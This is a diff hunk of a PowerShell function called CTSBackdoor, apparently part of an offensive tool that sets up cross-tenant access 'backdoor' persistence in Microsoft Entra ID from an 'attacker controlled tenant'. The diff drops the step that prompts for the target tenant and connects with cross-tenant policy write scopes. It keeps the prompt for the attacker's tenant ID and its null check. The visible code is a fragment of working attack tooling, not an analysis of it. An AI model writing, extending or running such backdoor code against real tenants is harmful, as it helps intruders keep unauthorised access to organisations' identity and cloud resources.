@@ -14,18 +14,12 @@ function CTSBackdoor {
     }
     Write-Host "`n"
 
-    #Select a target tenant
-    $TargetTenantId = Read-Host -Prompt "Enter the tenant Id from list to target for backdoor access creation"
-
-    #Connect to selected tenant
-    Connect-MgGraph -TenantId $TargetTenantId -Scopes "Policy.Read.All","Policy.ReadWrite.CrossTenantAccess" | Out-Null
-
     #Enter details for source tenant (attacker controlled tenant)
     $ExternalTenantId = Read-Host -Prompt "Enter the tenant ID of your tenant (backdoor tenant)"
 
-    if ($null -eq $ExternalTenantId -or $null-eq $TargetTenantId) {
-        Write-Host "ExternalTenantId and TargetTenantId cannot be null." -ForegroundColor Red
-        Write-Host "Exiting backdoor module now!"
+    if ($null -eq $ExternalTenantId) {
+        Write-Host "ExternalTenantId cannot be null." -ForegroundColor Red
+        Write-Host "Exiting backdoor module now!" -ForegroundColor Gray
         break
     }
 
